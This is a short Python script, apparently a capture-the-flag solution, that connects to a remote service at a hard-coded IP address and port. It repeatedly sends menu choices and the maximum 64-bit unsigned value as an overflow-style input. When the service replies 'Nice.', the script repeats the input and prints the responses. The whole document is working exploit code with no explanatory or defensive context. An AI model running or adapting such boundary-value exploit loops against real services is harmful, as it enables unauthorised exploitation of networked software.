r = remote('52.163.228.53', 8082)
tt = (1 << 64) - 1
tt = str(tt).encode()
for i in tqdm(range(0, 1000)):
	r.sendline("1")
	r.sendline(tt)
	cc = r.recvline()
	if cc[-6:] == b"Nice.\n":
		r.sendline("0")
		r.sendline(tt)
		cc = r.recvline()
		r.sendline("0")
		r.sendline(tt)
		cc = r.recvline()
		print(cc)
		print(r.recvline())
		print(r.recvline())
		break
